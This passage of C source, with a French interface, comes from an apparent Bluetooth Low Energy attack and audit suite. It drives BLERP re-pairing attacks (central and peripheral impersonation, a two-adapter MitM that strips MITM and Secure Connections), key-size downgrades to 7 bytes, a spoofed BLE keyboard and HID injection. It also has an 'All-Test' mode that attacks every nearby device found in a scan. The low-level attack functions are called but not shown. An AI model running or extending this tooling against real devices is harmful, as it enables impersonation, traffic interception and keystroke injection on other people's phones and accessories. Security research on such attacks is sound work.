            UI_YELLOW, UI_RESET);
 
     printf("%sAddress%s (AA:BB:CC:DD:EE:FF): ", UI_PINK, UI_RESET);
     fflush(stdout);
     char a[64];
     if (read_line(a, sizeof a) < 0 || a[0] == '\0') return;
 
     uint8_t addr[6];
     if (parse_addr(a, addr) < 0) {
         printf("  adresse invalide.\n");
         return;
     }
 
     printf("%sType%s (public/random) [random]: ", UI_PINK, UI_RESET);
     fflush(stdout);
     char t[16];
     uint8_t atype = BLEURP_BDADDR_LE_RANDOM;
     if (read_line(t, sizeof t) == 0 && strncmp(t, "public", 6) == 0) {
         atype = BLEURP_BDADDR_LE_PUBLIC;
     }
 
     long dev_id = ask_interface(bleurp_hci_find_default_dev());
 
     char as[18];
     snprintf(as, sizeof as, "%02X:%02X:%02X:%02X:%02X:%02X",
              addr[5], addr[4], addr[3], addr[2], addr[1], addr[0]);
 
     printf("\nConnexion à %s sur hci%ld via HCI User Channel...\n", as, dev_id);
     struct smp_probe_result res;
     if (smp_native_probe_device((int)dev_id, addr, atype, 6000, &res) < 0) {
         fprintf(stderr, "  %s[-] Sonde échouée (vérifiez rfkill/bluetoothd ou exécutez ./scripts/reset_bluetooth.sh)%s\n",
                 UI_RED, UI_RESET);
     } else {
         smp_native_print_result(&res, as);
     }
 
     printf("\n(entree pour continuer) ");
     fflush(stdout);
     char b[8];
     (void)read_line(b, sizeof b);
 }
 
 // [-0-] Pipeline Audit Tout-en-Un (Epitech Security Suite)
void menu_guided_audit_wizard(void) {
    signal(SIGINT, SIG_DFL);
    printf("\033[2J\033[H");
    printf("  %s============================================================%s\n", UI_PURPLE, UI_RESET);
    printf("  %s%s[-0-] Pipeline d'Audit Complet BLEURP (Tout-en-Un)%s\n", UI_YELLOW, UI_BOLD, UI_RESET);
    printf("  %s============================================================%s\n\n", UI_PURPLE, UI_RESET);
    printf("  %sCe wizard enchaîne automatiquement les phases d'audit BLE :%s\n", UI_PINK, UI_RESET);
    printf("    1. Découverte & Fingerprint des cibles avec suggestions\n");
    printf("    2. Reconnaissance GATT & recensement des caractéristiques ouvertes\n");
    printf("    3. Sonde de sécurité SMP (évaluation de robustesse cryptographique)\n");
    printf("    4. Test interactif / simulation HID si applicable\n");
    printf("    5. Synthèse & Rapport d'audit global structuré\n\n");

    long dev_id = ask_interface(bleurp_hci_find_default_dev());
    long scan_sec = ask_number("Durée du scan initial (sec)", "temps d'écoute", 10);
    if (scan_sec <= 0) scan_sec = 10;

    struct dev_table table;
    if (dev_table_init(&table) < 0) {
        perror("dev_table_init");
        return;
    }

    printf("\n  %s[*] Phase 1/5 : Détection et cartographie des appareils...%s\n", UI_PINK, UI_RESET);
    int rc = run_scan((int)dev_id, scan_sec, 1, &table);
    if (rc < 0 || dev_table_count(&table) == 0) {
        printf("  %s[-] Aucun appareil détecté pendant le scan.%s\n", UI_RED, UI_RESET);
        dev_table_free(&table);
        printf("\n(entree pour continuer) ");
        fflush(stdout);
        char b[8];
        (void)read_line(b, sizeof b);
        return;
    }

    dev_table_sort_by_rssi(&table);
    size_t count = dev_table_count(&table);
    size_t shown = count < 15 ? count : 15;

    printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
    printf("  %sPhase 2/5 : Sélection de la Cible & Suggestions d'Audit%s\n", UI_YELLOW, UI_RESET);
    printf("  %s============================================================%s\n", UI_PURPLE, UI_RESET);

    char row[192];
    for (size_t i = 0; i < shown; i++) {
        const struct dev_entry *e = dev_table_at(&table, i);
        ui_format_row(row, sizeof row, (int)i + 1, e);
        printf("  %s\n", row);
    }

    printf("\n  %sNuméro de l'appareil à auditer (1-%zu, ou vide pour annuler)%s : ",
           UI_PINK, shown, UI_RESET);
    fflush(stdout);
    char pick_buf[32];
    if (read_line(pick_buf, sizeof pick_buf) < 0 || pick_buf[0] == '\0') {
        dev_table_free(&table);
        return;
    }

    long target_idx = strtol(pick_buf, NULL, 10);
    if (target_idx < 1 || (size_t)target_idx > shown) {
        printf("  %sNuméro invalide.%s\n", UI_RED, UI_RESET);
        dev_table_free(&table);
        printf("\n(entree pour continuer) ");
        fflush(stdout);
        char b[8];
        (void)read_line(b, sizeof b);
        return;
    }

    const struct dev_entry *target = dev_table_at(&table, (size_t)target_idx - 1);
    uint8_t target_addr[6];
    memcpy(target_addr, target->address, 6);
    uint8_t target_atype = target->addr_type;
    char target_str[18];
    snprintf(target_str, sizeof(target_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             target_addr[5], target_addr[4], target_addr[3],
             target_addr[2], target_addr[1], target_addr[0]);

    printf("\n  %s[+] Cible sélectionnée : %s%s%s (%s, %s)\n",
           UI_GREEN, UI_BOLD, target_str, UI_RESET,
           (target->has_name && target->name[0]) ? target->name : "Nom inconnu",
           target_atype == BLEURP_BDADDR_LE_RANDOM ? "Random RPA" : "Public");

    // Phase 3 : Audit GATT
    printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
    printf("  %sPhase 3/5 : Reconnaissance & Audit GATT Non-Intrusif%s\n", UI_YELLOW, UI_RESET);
    printf("  %s============================================================%s\n", UI_PURPLE, UI_RESET);
    do_audit(target_addr, target_atype);

    // Phase 4 : Sonde SMP
    printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
    printf("  %sPhase 4/5 : Sonde de Sécurité SMP (Link Layer)%s\n", UI_YELLOW, UI_RESET);
    printf("  %s============================================================%s\n", UI_PURPLE, UI_RESET);
    struct smp_probe_result smp_res;
    memset(&smp_res, 0, sizeof(smp_res));
    int smp_rc = smp_native_probe_device((int)dev_id, target_addr, target_atype, 6000, &smp_res);
    if (smp_rc == 0) {
        smp_native_print_result(&smp_res, target_str);
    } else {
        printf("  %s[-] Sonde SMP non concluante (cible non joignable en liaison directe ou timeout).\n%s", UI_ORANGE, UI_RESET);
    }

    // Phase 5 : Test interactif / HID
    printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
    printf("  %sPhase 5/5 : Test d'Interaction / Simulation HID%s\n", UI_YELLOW, UI_RESET);
    printf("  %s============================================================%s\n", UI_PURPLE, UI_RESET);
    int do_hid = ask_yes_no("Tester l'injection HID sur cette cible ?",
                            "nécessite l'autorisation de la cible", 0);
    if (do_hid) {
        run_hid_wizard(target_str);
    }

    // Synthèse
    printf("\n  %s============================================================%s\n", UI_GREEN, UI_RESET);
    printf("  %s%s[+] SYNTHÈSE D'AUDIT BLEURP : %s%s\n", UI_GREEN, UI_BOLD, target_str, UI_RESET);
    printf("  %s============================================================%s\n", UI_GREEN, UI_RESET);
    printf("  • Cible           : %s [%s]\n", target_str, target_atype == BLEURP_BDADDR_LE_RANDOM ? "Random RPA" : "Public");
    printf("  • Nom             : %s\n", (target->has_name && target->name[0]) ? target->name : "Non annoncé");
    printf("  • Statut SMP      : %s\n",
           smp_res.success ? (smp_res.pairing_failed ? "Rejeté (Sécurisé)" : "Répondu (Évaluable)") : "Inaccessible");
    if (smp_res.success && !smp_res.pairing_failed) {
        bool vuln = (smp_res.auth_req & 0x04) == 0 && (smp_res.auth_req & 0x08) == 0;
        printf("  • Niveau de risque: %s%s%s\n",
               vuln ? UI_RED : UI_GREEN,
               vuln ? "ÉLEVÉ (Accepte appairage sans MITM ni Secure Connections)" : "FAIBLE (Exige protection renforcée)",
               UI_RESET);
    }
    printf("  %s============================================================%s\n\n", UI_GREEN, UI_RESET);

    dev_table_free(&table);
    printf("(entree pour revenir au menu principal) ");
    fflush(stdout);
    char b[8];
    (void)read_line(b, sizeof b);
}

// [-6-] Keyboard Peripheral wizard
 static void menu_keyboard_wizard(void) {
     signal(SIGINT, SIG_DFL);
     printf("\033[2J\033[H");
     printf("  %s[-6-] BLE Keyboard (Peripheral HOGP)%s \342\200\224 émulateur clavier Bluetooth\n\n",
            UI_YELLOW, UI_RESET);
     printf("  %sLe PC diffuse des annonces de Clavier BLE (Appearance 0x03C1, Service 0x1812).%s\n",
            UI_PURPLE, UI_RESET);
     printf("  %sPermet à l'iPhone / Android de se connecter proprement et de négocier l'appairage SMP.%s\n\n",
            UI_PURPLE, UI_RESET);
 
     long dev_id = ask_interface(bleurp_hci_find_default_dev());
 
     printf("  %sNom du périphérique%s [BLEURP Keyboard] : ", UI_PINK, UI_RESET);
     fflush(stdout);
     char name_buf[64];
     const char *name = "BLEURP Keyboard";
     if (read_line(name_buf, sizeof(name_buf)) == 0 && name_buf[0] != '\0') {
         name = name_buf;
     }
 
     printf("\n  %sMode de sécurité SMP%s :\n", UI_PINK, UI_RESET);
     printf("    %s1.%s Just Works (Bonding seul, AuthReq=0x01)\n", UI_YELLOW, UI_RESET);
     printf("    %s2.%s MITM Protection (AuthReq=0x05)\n", UI_YELLOW, UI_RESET);
     printf("    %s3.%s Secure Connections + MITM (AuthReq=0x0D)\n", UI_YELLOW, UI_RESET);
     printf("    %s4.%s Downgrade Test (KeySize=7, AuthReq=0x01)\n", UI_YELLOW, UI_RESET);
     long mode = ask_number("Choix du mode", "1-4", 1);
 
     uint8_t auth = 0x01;
     uint8_t ksize = 16;
     uint8_t iocap = 0x03; // NoInputNoOutput (Just Works)
     if (mode == 2) { auth = 0x05; iocap = 0x00; } // DisplayOnly
     else if (mode == 3) { auth = 0x0D; iocap = 0x03; }
     else if (mode == 4) { auth = 0x01; ksize = 7; iocap = 0x03; }
 
     struct peripheral_config cfg = {
         .dev_id = (int)dev_id,
         .device_name = name,
         .io_capability = iocap,
         .auth_req = auth,
         .max_key_size = ksize,
         .trigger_sec_req = true,
         .payload_file = NULL
     };
 
     peripheral_keyboard_run(&cfg);
 
     printf("\n(entree pour continuer) ");
     fflush(stdout);
     char b[8];
     (void)read_line(b, sizeof b);
 }

// What a Pairing Failed reason tells us about the verdicts (paper §VII-A).
static const char *refusal_meaning(uint8_t reason) {
    switch (reason) {
    case 0x03: return "refus 0x03 (Authentication Requirements) : anti-downgrade MITM actif.";
    case 0x06: return "refus 0x06 (Encryption Key Size) : anti-downgrade de l'entropie actif.";
    case 0x05: return "refus 0x05 (Pairing Not Supported) : non concluant pour le downgrade.";
    default:   return "refus SMP sans lien connu avec un anti-downgrade.";
    }
}

// One verdict line per target, derived from its merged verdicts.
static void print_target_rating(const struct blerp_target_verdict *tv, enum blerp_rating r) {
    if (r == BLERP_RATING_VULNERABLE) {
        char list[64] = "";
        for (int i = 0; i < BLERP_VULN_COUNT; i++) {
            if (tv->v[i] != BLERP_VERDICT_YES) continue;
            size_t used = strlen(list);
            snprintf(list + used, sizeof list - used, "%s%s", used ? " " : "",
                     blerp_vuln_code((enum blerp_vuln)i));
        }
        printf("  %s[!] Verdict : VULNÉRABLE (%s)%s\n", UI_RED, list, UI_RESET);
    } else if (r == BLERP_RATING_PROTECTED) {
        printf("  %s[+] Verdict : PROTÉGÉE. %s%s\n", UI_GREEN,
               tv->refusal ? refusal_meaning(tv->refusal) : "re-pairing non authentifié refusé.",
               UI_RESET);
    } else {
        printf("  %s[?] Verdict : NON CONCLUANT (aucune vulnérabilité confirmée, aucun refus probant).%s\n",
               UI_ORANGE, UI_RESET);
    }
}

// One BLERP test run against a target. Its verdicts are merged into `tv`; the
// caller turns them into a rating. Nothing is claimed here beyond what was seen.
static void eval_target_test(int dev_id, enum blerp_attack_type type,
                             const uint8_t *addr, uint8_t atype,
                             const char *as, const char *name, int8_t rssi,
                             const struct smp_bond_info *pbond,
                             struct blerp_target_verdict *tv) {
    struct blerp_attack_config cfg;
    blerp_config_init(&cfg, type);
    cfg.dev_id = dev_id;
    if (addr) memcpy(cfg.target_addr, addr, 6);
    cfg.target_type = atype;
    cfg.downgraded_authreq = 0x01; // Just Works (BLERP downgrade)
    cfg.downgraded_keysize = 7;    // 7-byte entropy downgrade (KNOB)
    cfg.wait_conn_ms = 4000;
    cfg.wait_react_ms = 5000;
    if (name) strncpy(cfg.adv_name, name, sizeof(cfg.adv_name) - 1);
    if (type == BLERP_ATTACK_PI) {
        if (addr) memcpy(cfg.spoof_addr, addr, 6);
        cfg.spoof_type = atype;
        cfg.reject_enc = true;
    }

    const char *mode_name = (type == BLERP_ATTACK_PI) ? "Peripheral Impersonation (PI)" :
                            (type == BLERP_ATTACK_CI) ? "Central Impersonation (CI)" :
                            "Audit Automatisé V1-V6";

    printf("\n  %s[*] Évaluation BLERP [%s] sur %s (%s, RSSI: %d dBm)...%s\n",
           UI_PINK, mode_name, as ? as : "(broadcast)", name ? name : "Inconnu", (int)rssi, UI_RESET);
    if (pbond) {
        printf("  %s[+] Bond BlueZ existant trouvé : %s, clé %d octets (ARPK)%s\n",
               UI_GREEN, pbond->authenticated ? "authentifié (MITM)" : "non authentifié",
               pbond->enc_size, UI_RESET);
    }

    struct blerp_attack_report rep;
    memset(&rep, 0, sizeof rep);

    int rc = 0;
    if (type == BLERP_ATTACK_PI) {
        rc = blerp_run_pi(&cfg, &rep);
    } else if (type == BLERP_ATTACK_CI) {
        rc = blerp_run_ci(&cfg, &rep);
    } else {
        rc = blerp_run_audit(&cfg, pbond, &rep);
    }

    if (rc < 0) {
        fprintf(stderr, "  %s[-] Échec de la sonde BLERP sur %s (vérifier adaptateur / droits root / CAP_NET_ADMIN).%s\n",
                UI_RED, as ? as : "", UI_RESET);
        return;
    }

    if (type == BLERP_ATTACK_PI || type == BLERP_ATTACK_CI) {
        blerp_classify_vulnerabilities(pbond, &rep, &rep);
    }

    if (type == BLERP_ATTACK_AUDIT) {
        blerp_print_report(&cfg, pbond, &rep);
    } else {
        for (int i = 0; i < BLERP_VULN_COUNT; i++) {
            if (rep.verdicts[i] == BLERP_VERDICT_YES) {
                printf("  %s[+] %s : %s%s\n", UI_GREEN, blerp_vuln_code((enum blerp_vuln)i),
                       rep.vuln_details[i], UI_RESET);
            }
        }
    }
    blerp_target_verdict_merge(tv, rep.verdicts, rep.pairing_failed ? rep.fail_reason : 0);

    if (rep.phase2_completed) {
        printf("  %s[+] Handshake Phase 2 validé, clé STK dérivée (%d octets).%s\n",
               UI_GREEN, rep.negotiated_keysize, UI_RESET);
    } else if (!rep.connected) {
        printf("  %s[-] Échec de connexion radio Link Layer vers %s.%s\n", UI_ORANGE, as ? as : "", UI_RESET);
    }
}

// The four tests on one target, merged into `tv`. Test 4 maps the standard
// re-pairing probe onto V2/V4/V6, using the stored bond as the paper requires.
static void eval_all_4_tests(int dev_id, const uint8_t *addr, uint8_t atype,
                             const char *as, const char *name, int8_t rssi,
                             const struct smp_bond_info *pbond,
                             struct blerp_target_verdict *tv) {
    printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
    printf("  %s[*] Suite BLERP complète (4 vecteurs) sur %s (%s)%s\n", UI_YELLOW, as ? as : "", name ? name : "Inconnu", UI_RESET);
    printf("  %s============================================================%s\n", UI_PURPLE, UI_RESET);

    printf("\n  %s--- [Test 1/4] Central Impersonation (CI) ---%s\n", UI_PINK, UI_RESET);
    eval_target_test(dev_id, BLERP_ATTACK_CI, addr, atype, as, name, rssi, pbond, tv);

    printf("\n  %s--- [Test 2/4] Peripheral Impersonation (PI) ---%s\n", UI_PINK, UI_RESET);
    eval_target_test(dev_id, BLERP_ATTACK_PI, addr, atype, as, name, rssi, pbond, tv);

    printf("\n  %s--- [Test 3/4] Diagnostic Complet V1-V6 ---%s\n", UI_PINK, UI_RESET);
    eval_target_test(dev_id, BLERP_ATTACK_AUDIT, addr, atype, as, name, rssi, pbond, tv);

    printf("\n  %s--- [Test 4/4] Sonde de Re-Pairing (Standard) ---%s\n", UI_PINK, UI_RESET);
    struct smp_pairing_params offer;
    smp_native_default_offer(&offer);
    offer.auth_req = 0x01;
    offer.max_key_size = 7;
    struct smp_probe_result res;
    memset(&res, 0, sizeof res);
    (void)smp_native_probe_offer(dev_id, addr, atype, 4000, &offer, &res);

    struct smp_repair_verdict rv;
    smp_repair_classify(pbond, &offer, &res, &rv);
    bool bond_auth = pbond && pbond->authenticated;
    enum blerp_verdict pv[BLERP_VULN_COUNT];
    for (int i = 0; i < BLERP_VULN_COUNT; i++) pv[i] = BLERP_VERDICT_INCONCLUSIVE;
    pv[BLERP_V2_UNAUTH_REPAIR]     = smp_repair_verdict_v2(&rv);
    pv[BLERP_V4_LEVEL_DOWNGRADE]   = smp_repair_verdict_v4(bond_auth, &rv);
    pv[BLERP_V6_ENTROPY_DOWNGRADE] = smp_repair_verdict_v6(&rv);
    blerp_target_verdict_merge(tv, pv, rv.outcome == SMP_REPAIR_REFUSED ? rv.fail_reason : 0);

    switch (rv.outcome) {
    case SMP_REPAIR_REFUSED:
        printf("  %s[-] Sonde : refus SMP 0x%02x. %s%s\n", UI_GREEN, rv.fail_reason,
               refusal_meaning(rv.fail_reason), UI_RESET);
        break;
    case SMP_REPAIR_ACCEPTED_DOWNGRADE:
        printf("  %s[!] Sonde : re-pairing accepté sous le niveau de l'ARPK.%s\n", UI_RED, UI_RESET);
        break;
    case SMP_REPAIR_ACCEPTED_SAFE:
        printf("  %s[!] Sonde : re-pairing accepté sans authentification (V2), sans descendre sous l'ARPK.%s\n",
               UI_RED, UI_RESET);
        break;
    case SMP_REPAIR_NO_REPLY:
        printf("  %s[-] Sonde : pas de réponse SMP, non concluant.%s\n", UI_ORANGE, UI_RESET);
        break;
    }
}

// Single BLERP test with its rating printed. True only when vulnerable.
static bool run_blerp_target_test(int dev_id, enum blerp_attack_type type,
                                  const uint8_t *addr, uint8_t atype,
                                  const char *as, const char *name, int8_t rssi,
                                  const struct smp_bond_info *pbond) {
    struct blerp_target_verdict tv;
    blerp_target_verdict_init(&tv);
    eval_target_test(dev_id, type, addr, atype, as, name, rssi, pbond, &tv);
    enum blerp_rating r = blerp_target_rating(&tv);
    print_target_rating(&tv, r);
    return r == BLERP_RATING_VULNERABLE;
}

// Four-test suite with its rating printed. True only when vulnerable.
static bool run_blerp_all_4_tests(int dev_id, const uint8_t *addr, uint8_t atype,
                                  const char *as, const char *name, int8_t rssi,
                                  const struct smp_bond_info *pbond) {
    struct blerp_target_verdict tv;
    blerp_target_verdict_init(&tv);
    eval_all_4_tests(dev_id, addr, atype, as, name, rssi, pbond, &tv);
    enum blerp_rating r = blerp_target_rating(&tv);
    print_target_rating(&tv, r);
    return r == BLERP_RATING_VULNERABLE;
}

// [-B-] BLERP Attack wizard: standalone interactive menu for executing CI, PI, MitM, or full audit,
// fully integrated with Option Finale (Scan 15s, BlueZ bonds, manual input, single target or All-Test).
static void menu_blerp_wizard(void) {
    signal(SIGINT, SIG_DFL);
    printf("\n  %s=== BLERP Attack Suite (sacca97/blerp NDSS 2026) ===%s\n", UI_PINK, UI_RESET);
    long dev_id = ask_interface(bleurp_hci_find_default_dev());

    printf("  %sModes d'attaque BLERP :%s\n", UI_PINK, UI_RESET);
    printf("  %s[-1-]%s Central Impersonation (CI)     - Cible accessoire / périphérique\n", UI_YELLOW, UI_RESET);
    printf("  %s[-2-]%s Peripheral Impersonation (PI)  - Cible smartphone / centrale (Rejet V5)\n", UI_YELLOW, UI_RESET);
    printf("  %s[-3-]%s Double-Channel MitM (2 dev)   - Interception & stripping MITM/SC\n", UI_YELLOW, UI_RESET);
    printf("  %s[-4-]%s Audit complet V1-V6           - Cascade diagnostique officielle\n", UI_YELLOW, UI_RESET);
    printf("  %s[-5-]%s Suite Complète (4 Tests)      - CI + PI + Audit V1-V6 + Re-Pairing\n", UI_YELLOW, UI_RESET);
    printf("  %s[-6-]%s Option Finale (Automatisée)   - Pipeline complet : Consentement -> Scan 15s -> Test / All-Test\n", UI_GREEN, UI_RESET);
    printf("  %sSélectionnez [1-6] : %s", UI_PINK, UI_RESET);
    fflush(stdout);
    char mline[16];
    if (read_line(mline, sizeof mline) < 0 || mline[0] == '\0') return;

    if (mline[0] == '6' || mline[0] == 'f' || mline[0] == 'F') {
        menu_finale_wizard(-1);
        return;
    }

    if (mline[0] == '3') {
        long dev_id2 = ask_number("Interface secondaire", "index HCI pour l'autre rôle (ex: 1)", 1);
        struct blerp_attack_config cfg;
        blerp_config_init(&cfg, BLERP_ATTACK_MITM);
        cfg.dev_id = (int)dev_id;
        cfg.dev_id_sec = (int)dev_id2;
        struct blerp_attack_report rep;
        blerp_run_mitm(&cfg, &rep);
        printf("\n(entree pour continuer) ");
        fflush(stdout);
        char b[8];
        (void)read_line(b, sizeof b);
        return;
    }

    bool is_suite_4 = (mline[0] == '5');
    enum blerp_attack_type type = (mline[0] == '2') ? BLERP_ATTACK_PI :
                                  (mline[0] == '4') ? BLERP_ATTACK_AUDIT :
                                  BLERP_ATTACK_CI;

    const char *mode_label = is_suite_4 ? "Suite Complète 4 Tests" :
                             (type == BLERP_ATTACK_PI ? "Peripheral Impersonation (PI)" :
                             (type == BLERP_ATTACK_AUDIT ? "Audit V1-V6" : "Central Impersonation (CI)"));

    printf("\n  %sSélection de la cible pour [%s] :%s\n", UI_PINK, mode_label, UI_RESET);
    printf("  %s[1]%s Scanner l'environnement (Scan BLE 15s - flux Option Finale) [Défaut]\n", UI_YELLOW, UI_RESET);
    printf("  %s[2]%s Sélectionner parmi les bonds BlueZ existants\n", UI_YELLOW, UI_RESET);
    printf("  %s[3]%s Saisie manuelle de l'adresse MAC\n", UI_YELLOW, UI_RESET);
    printf("  %s[4]%s Mode All-Test (scan 15s puis attaque sur TOUTES les cibles)\n", UI_YELLOW, UI_RESET);
    printf("  %sChoix [1-4, défaut 1] : %s", UI_PINK, UI_RESET);
    fflush(stdout);
    char tsel[16];
    if (read_line(tsel, sizeof tsel) < 0) return;

    char adapter[18];
    bool has_adapter = (smp_adapter_addr((int)dev_id, adapter) == 0);
    char bonded_list[32][18];
    int n_bonds = 0;
    if (has_adapter) {
        n_bonds = smp_bond_list(BLEURP_BLUEZ_STORE_DIR, adapter, bonded_list, 32);
        if (n_bonds < 0) n_bonds = 0;
    }

    if (tsel[0] == '2') {
        if (n_bonds == 0) {
            printf("\n  %s[-] Aucun bond BlueZ trouvé pour cet adaptateur (%s). Bascule en saisie manuelle.%s\n",
                   UI_ORANGE, adapter, UI_RESET);
            tsel[0] = '3';
        } else {
            printf("\n  %sBonds BlueZ enregistrés :%s\n", UI_PINK, UI_RESET);
            for (int b = 0; b < n_bonds; b++) {
                printf("    %s[%d]%s %s\n", UI_YELLOW, b + 1, UI_RESET, bonded_list[b]);
            }
            printf("  %sNuméro du bond [1-%d, défaut 1] : %s", UI_PINK, n_bonds, UI_RESET);
            fflush(stdout);
            char bnum[16];
            int bidx = 1;
            if (read_line(bnum, sizeof bnum) == 0 && bnum[0] != '\0') {
                bidx = atoi(bnum);
            }
            size_t uidx = (bidx >= 1 && bidx <= n_bonds) ? (size_t)(bidx - 1) : 0;
            if (uidx >= 32) uidx = 0;
            char target_str[18];
            strncpy(target_str, bonded_list[uidx], sizeof(target_str) - 1);
            target_str[sizeof(target_str) - 1] = '\0';
            uint8_t addr[6];
            parse_addr(target_str, addr);
            struct smp_bond_info bond;
            struct smp_bond_info *pbond = (smp_bond_load(BLEURP_BLUEZ_STORE_DIR, adapter, target_str, &bond) == 0) ? &bond : NULL;
            bool auth = false;
            if (is_suite_4) {
                auth = run_blerp_all_4_tests((int)dev_id, addr, BLEURP_BDADDR_LE_PUBLIC, target_str, "Bond BlueZ", -50, pbond);
            } else {
                auth = run_blerp_target_test((int)dev_id, type, addr, BLEURP_BDADDR_LE_PUBLIC, target_str, "Bond BlueZ", -50, pbond);
            }
            if (auth) banner_print_success(stdout);
            printf("\n(entree pour continuer) ");
            fflush(stdout);
            char b[8];
            (void)read_line(b, sizeof b);
            return;
        }
    }

    if (tsel[0] == '3') {
        printf("  %sAdresse cible%s (AA:BB:CC:DD:EE:FF): ", UI_PINK, UI_RESET);
        fflush(stdout);
        char addr_str[64];
        if (read_line(addr_str, sizeof addr_str) < 0 || addr_str[0] == '\0') return;

        uint8_t addr[6];
        if (parse_addr(addr_str, addr) < 0) {
            printf("  [-] Adresse invalide.\n");
            return;
        }

        printf("  %sType d'adresse%s (public/random) [public]: ", UI_PINK, UI_RESET);
        fflush(stdout);
        char t[16];
        uint8_t atype = BLEURP_BDADDR_LE_PUBLIC;
        if (read_line(t, sizeof t) == 0 && strncmp(t, "random", 6) == 0) atype = BLEURP_BDADDR_LE_RANDOM;

        struct smp_bond_info bond;
        struct smp_bond_info *pbond = (has_adapter && smp_bond_load(BLEURP_BLUEZ_STORE_DIR, adapter, addr_str, &bond) == 0) ? &bond : NULL;

        bool auth = false;
        if (is_suite_4) {
            auth = run_blerp_all_4_tests((int)dev_id, addr, atype, addr_str, "Cible manuelle", -50, pbond);
        } else {
            auth = run_blerp_target_test((int)dev_id, type, addr, atype, addr_str, "Cible manuelle", -50, pbond);
        }
        if (auth) banner_print_success(stdout);

        printf("\n(entree pour continuer) ");
        fflush(stdout);
        char b[8];
        (void)read_line(b, sizeof b);
        return;
    }

    // Flux de Scan 15s (Option Finale intégrée dans Option B)
    int is_all = (tsel[0] == '4') ? 1 : 0;
    printf("\n  %s[*] Lancement du scan BLE (15 secondes)...%s\n\n", UI_GREEN, UI_RESET);
    struct dev_table table;
    if (dev_table_init(&table) < 0) {
        perror("dev_table_init");
        return;
    }

    int rc = run_scan((int)dev_id, 15, 1, &table);
    if (rc < 0) {
        printf("\n  %s[-] Scan indisponible.%s\n", UI_RED, UI_RESET);
        dev_table_free(&table);
        printf("\n(entree pour continuer) ");
        fflush(stdout);
        char b[8];
        (void)read_line(b, sizeof b);
        return;
    }

    dev_table_sort_by_rssi(&table);
    size_t count = dev_table_count(&table);

    if (count == 0 && n_bonds == 0) {
        printf("\n  %s[-] Aucun appareil détecté après 15s de scan et aucun bond connu.%s\n", UI_RED, UI_RESET);
        dev_table_free(&table);
        printf("\n(entree pour continuer) ");
        fflush(stdout);
        char b[8];
        (void)read_line(b, sizeof b);
        return;
    }

    printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
    printf("  %sAppareils détectés pendant le scan (15s) : %zu trouvé(s)%s\n", UI_YELLOW, count, UI_RESET);
    printf("  %s============================================================%s\n", UI_PURPLE, UI_RESET);

    char row[192];
    size_t shown = count < 10 ? count : 10;
    for (size_t i = 0; i < shown; i++) {
        const struct dev_entry *e = dev_table_at(&table, i);
        ui_format_row(row, sizeof row, (int)i + 1, e);
        printf("  %s\n", row);
    }

    if (!is_all && count > 1) {
        printf("\n  %sNuméro de l'appareil à tester (1-%zu, [1] par défaut, 'A' pour All-Test) : %s", UI_PINK, shown, UI_RESET);
        fflush(stdout);
        char pnum[16];
        if (read_line(pnum, sizeof pnum) == 0 && pnum[0] != '\0') {
            if (pnum[0] == 'a' || pnum[0] == 'A') {
                is_all = 1;
            }
        }
    }

    if (is_all) {
        printf("\n  %s[*] Démarrage de la séquence All-Test BLERP [%s] sur %zu appareil(s) (Ctrl-C pour interrompre)...%s\n",
               UI_YELLOW, mode_label, count, UI_RESET);
        signal(SIGINT, on_sigint);
        g_stop = 0;
        int total_tested = 0;
        int total_authorized = 0;
        for (size_t i = 0; i < count && !g_stop; i++) {
            const struct dev_entry *e = dev_table_at(&table, i);
            char as[18];
            snprintf(as, sizeof as, "%02X:%02X:%02X:%02X:%02X:%02X",
                     e->address[5], e->address[4], e->address[3],
                     e->address[2], e->address[1], e->address[0]);
            const char *name = (e->has_name && e->name[0]) ? e->name : "Inconnu";
            printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
            printf("  [%zu/%zu] Cible : %s%s%s (%s, RSSI: %d dBm)\n",
                   i + 1, count, UI_PINK, as, UI_RESET, name, (int)e->rssi);
            struct smp_bond_info bond;
            struct smp_bond_info *pbond = (has_adapter && smp_bond_load(BLEURP_BLUEZ_STORE_DIR, adapter, as, &bond) == 0) ? &bond : NULL;
            bool auth = false;
            if (is_suite_4) {
                auth = run_blerp_all_4_tests((int)dev_id, e->address, e->addr_type, as, name, e->rssi, pbond);
            } else {
                auth = run_blerp_target_test((int)dev_id, type, e->address, e->addr_type, as, name, e->rssi, pbond);
            }
            if (auth) total_authorized++;
            total_tested++;
        }
        signal(SIGINT, SIG_DFL);
        printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
        printf("  %sSynthèse All-Test BLERP : %d / %d appareil(s) vulnérable(s) au re-pairing%s\n",
               total_authorized > 0 ? UI_GREEN : UI_YELLOW, total_authorized, total_tested, UI_RESET);
        printf("  %s============================================================%s\n", UI_PURPLE, UI_RESET);
        if (total_authorized > 0) banner_print_success(stdout);
    } else {
        const struct dev_entry *target = NULL;
        for (size_t i = 0; i < count; i++) {
            const struct dev_entry *e = dev_table_at(&table, i);
            char as[18];
            snprintf(as, sizeof as, "%02X:%02X:%02X:%02X:%02X:%02X",
                     e->address[5], e->address[4], e->address[3],
                     e->address[2], e->address[1], e->address[0]);
            for (int b = 0; b < n_bonds; b++) {
                if (strcasecmp(as, bonded_list[b]) == 0) {
                    target = e;
                    break;
                }
            }
            if (target) break;
        }
        if (!target && count > 0) {
            target = dev_table_at(&table, 0);
        }

        uint8_t target_addr[6];
        uint8_t target_atype = BLEURP_BDADDR_LE_PUBLIC;
        char target_str[18] = "";
        char target_name[256] = "Inconnu";
        int8_t target_rssi = -100;

        if (target) {
            memcpy(target_addr, target->address, 6);
            target_atype = target->addr_type;
            target_rssi = target->rssi;
            snprintf(target_str, sizeof target_str, "%02X:%02X:%02X:%02X:%02X:%02X",
                     target_addr[5], target_addr[4], target_addr[3],
                     target_addr[2], target_addr[1], target_addr[0]);
            if (target->has_name && target->name[0]) {
                snprintf(target_name, sizeof target_name, "%s", target->name);
            }
        } else if (n_bonds > 0) {
            parse_addr(bonded_list[0], target_addr);
            snprintf(target_str, sizeof target_str, "%s", bonded_list[0]);
            target_atype = BLEURP_BDADDR_LE_PUBLIC;
            snprintf(target_name, sizeof target_name, "Bond BlueZ");
        }

        struct smp_bond_info bond;
